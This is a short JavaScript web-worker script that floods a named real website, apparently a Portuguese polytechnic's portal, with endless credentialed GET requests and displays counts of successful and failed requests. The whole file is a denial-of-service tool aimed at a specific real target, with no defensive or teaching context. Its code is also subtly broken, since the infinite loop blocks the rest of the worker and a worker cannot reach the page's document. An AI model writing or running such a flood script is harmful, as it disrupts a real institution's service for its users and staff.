var requests = { great: 0, notGreat: 0 };

var divId;

self.addEventListener('message', function (e) {
    divId = e.data[0];
}, false);

while (true) {
    fetch("https://domus.ipp.pt/home/", {
        "headers": {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-GB,en;q=0.9",
            "cache-control": "max-age=0",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1"
        },
        "referrerPolicy": "strict-origin-when-cross-origin",
        "body": null,
        "method": "GET",
        "mode": "cors",
        "credentials": "include"
    }).then((x) => {
        if (x.ok) {
            requests.great++;
        } else {
            requests.notGreat++;
        }
    }).catch((_) => {
        requests.notGreat++;
    });
}

setInterval(() => {
    document.getElementById(divId).innerHTML = `Successful Requests: ${requests.great} | Insucessful Requests: ${requests.notGreat}`; 
}, 2500);
